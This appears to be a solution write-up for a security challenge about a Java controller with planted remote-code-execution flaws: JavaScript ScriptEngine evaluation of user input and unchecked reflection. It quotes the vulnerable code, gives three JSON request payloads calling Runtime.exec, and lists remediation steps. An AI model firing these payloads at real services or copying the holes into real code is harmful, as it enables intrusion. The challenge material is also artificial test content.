# Challenge 32: Multi-Vector Code Execution via Expression Evaluation

## Vulnerability
This application has multiple code execution vulnerabilities hidden behind seemingly legitimate functionality. The main issues are unsafe use of ScriptEngine for expression evaluation and unrestricted reflection.

## Locations and Issues

### 1. JavaScript Engine Code Execution
`DataProcessorController.java` lines 153-162 and 165-174:
```java
javax.script.ScriptEngine engine = manager.getEngineByName("JavaScript");
engine.put("target", target);
return engine.eval(expression);
```

### 2. Reflection-based Class Loading
`DataProcessorController.java` lines 124-136:
```java
String className = "com.custom.operations." + operation...
Class<?> operationClass = Class.forName(className);
```

### 3. Unrestricted Reflection with Insufficient Validation
`DataProcessorController.java` lines 143-150:
```java
if (!className.startsWith("java.lang") && !className.startsWith("java.util")) {
    throw new SecurityException("Unauthorized class access");
}
```

## Impact
- Remote Code Execution through JavaScript engine
- Arbitrary class instantiation and method invocation
- Information disclosure through reflection
- Potential system compromise

## Why It's Hard to Detect
- The security patterns block obvious malicious keywords
- Class validation appears to restrict to safe packages
- Expression evaluation looks like legitimate business logic
- Multiple attack vectors create complexity for static analysis
- The vulnerability requires understanding the interaction between components

## Exploitations

### Vector 1: JavaScript Engine RCE
POST to `/api/process`:
```json
{
  "operation": "transform",
  "data": {
    "expression": "java.lang.Runtime.getRuntime().exec('whoami')",
    "target": "test"
  }
}
```

### Vector 2: Reflection bypass
POST to `/api/process`:
```json
{
  "operation": "customOp",
  "data": {
    "className": "java.lang.Runtime",
    "methodName": "getRuntime"
  }
}
```

### Vector 3: Formula evaluation RCE
POST to `/api/process`:
```json
{
  "operation": "calculate",
  "data": {
    "formula": "java.lang.Runtime.getRuntime().exec('id')"
  }
}
```

## Remediation
1. Remove or severely restrict ScriptEngine usage
2. Implement proper sandboxing for expression evaluation
3. Use whitelisting instead of blacklisting for class access
4. Avoid dynamic class loading based on user input
5. Use safe mathematical expression evaluators
6. Implement proper input validation and sanitization
